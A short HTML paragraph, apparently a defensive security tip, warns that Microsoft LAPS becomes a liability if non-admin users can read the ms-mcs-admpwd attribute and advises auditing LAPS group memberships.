<p>LAPS is an excellent defense-in-depth tool, but if any non-admin user can read <code>ms-mcs-admpwd</code>, it becomes a liability. Always audit LAPS group memberships.</p>
